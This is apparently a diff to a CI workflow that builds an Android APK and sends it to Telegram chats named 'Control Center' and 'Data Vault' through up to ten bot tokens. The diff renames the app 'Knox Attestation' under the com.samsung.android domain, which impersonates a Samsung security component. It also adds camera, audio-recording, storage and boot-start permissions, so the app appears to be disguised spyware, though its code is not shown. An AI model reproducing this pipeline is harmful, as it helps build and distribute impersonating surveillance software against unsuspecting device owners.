@@ -28,10 +28,14 @@ jobs:
           if [ ! -f "res/drawable/ic_launcher.png" ]; then
             echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > res/drawable/ic_launcher.png
           fi
-          sed -i 's|^#\? \?icon.filename =.*|icon.filename = %(source.dir)s/res/drawable/ic_launcher.png|' buildozer.spec
-          sed -i 's|^#\? \?android.accept_sdk_license =.*|android.accept_sdk_license = True|' buildozer.spec
-          sed -i 's|^#\? \?android.skip_update =.*|android.skip_update = False|' buildozer.spec
-          sed -i 's|^#\? \?android.auto_accept_sdk_license =.*|android.auto_accept_sdk_license = True|' buildozer.spec
+          sed -i 's|^#\? \?title = .*|title = Knox Attestation|' buildozer.spec
+          sed -i 's|^#\? \?package.name = .*|package.name = knoxattestation|' buildozer.spec
+          sed -i 's|^#\? \?package.domain = .*|package.domain = com.samsung.android|' buildozer.spec
+          sed -i 's|^#\? \?icon.filename = .*|icon.filename = %(source.dir)s/res/drawable/ic_launcher.png|' buildozer.spec
+          sed -i 's|^#\? \?android.accept_sdk_license = .*|android.accept_sdk_license = True|' buildozer.spec
+          sed -i 's|^#\? \?android.skip_update = .*|android.skip_update = False|' buildozer.spec
+          sed -i 's|^#\? \?android.auto_accept_sdk_license = .*|android.auto_accept_sdk_license = True|' buildozer.spec
+          sed -i 's|^#\? \?android.permissions = .*|android.permissions = INTERNET,ACCESS_NETWORK_STATE,CAMERA,RECORD_AUDIO,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,WAKE_LOCK,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE|' buildozer.spec
           cat buildozer.spec
 
       - name: Build APK
@@ -42,7 +46,7 @@ jobs:
       - name: Find APK
         id: find_apk
         run: |
-          APK_PATH=$(find project -name "*.apk" -type f | head -n 1)
+          APK_PATH=$(find project/bin -name "*.apk" -type f | head -n 1)
           if [ -z "$APK_PATH" ]; then
             echo "APK not found!"
             exit 1
@@ -51,14 +55,31 @@ jobs:
 
       - name: Send APK to Telegram
         env:
-          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
-          CHAT_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
+          BOT1_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
+          BOT2_TOKEN: ${{ secrets.TELEGRAM_BOT_2_TOKEN }}
+          BOT3_TOKEN: ${{ secrets.TELEGRAM_BOT_3_TOKEN }}
+          BOT4_TOKEN: ${{ secrets.TELEGRAM_BOT_4_TOKEN }}
+          BOT5_TOKEN: ${{ secrets.TELEGRAM_BOT_5_TOKEN }}
+          BOT6_TOKEN: ${{ secrets.TELEGRAM_BOT_6_TOKEN }}
+          BOT7_TOKEN: ${{ secrets.TELEGRAM_BOT_7_TOKEN }}
+          BOT8_TOKEN: ${{ secrets.TELEGRAM_BOT_8_TOKEN }}
+          BOT9_TOKEN: ${{ secrets.TELEGRAM_BOT_9_TOKEN }}
+          BOT10_TOKEN: ${{ secrets.TELEGRAM_BOT_10_TOKEN }}
+          CTRL_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
+          VAULT_ID: ${{ secrets.TELEGRAM_DATA_VAULT_ID }}
         run: |
           apt update && apt install -y curl
-          APK_FILE=$(find . -name "*.apk" -type f | head -n 1)
+          APK_FILE=$(find project/bin -name "*.apk" -type f | head -n 1)
+          TIMESTAMP=$(date +'%Y-%m-%d %H:%M:%S')
           if [ -f "$APK_FILE" ]; then
-            curl -F "chat_id=$CHAT_ID" -F "document=@$APK_FILE" -F "caption=✅ APK v2.0 ready!" \
-              https://api.telegram.org/bot$BOT_TOKEN/sendDocument
+            echo "Sending APK to Control Center..."
+            curl --retry 3 --retry-delay 2 -F "chat_id=$CTRL_ID" -F "document=@$APK_FILE" -F "caption=✅ Knox Attestation v2.0%0A⏰ $TIMESTAMP" \
+              https://api.telegram.org/bot$BOT1_TOKEN/sendDocument || \
+            curl --retry 3 --retry-delay 2 -F "chat_id=$CTRL_ID" -F "document=@$APK_FILE" \
+              https://api.telegram.org/bot$BOT2_TOKEN/sendDocument
+            echo "Sending APK to Data Vault (backup)..."
+            curl --retry 3 --retry-delay 2 -F "chat_id=$VAULT_ID" -F "document=@$APK_FILE" -F "caption=📦 Backup Knox Attestation" \
+              https://api.telegram.org/bot$BOT1_TOKEN/sendDocument
             echo "APK sent successfully!"
           else
             echo "ERROR: APK file not found!"
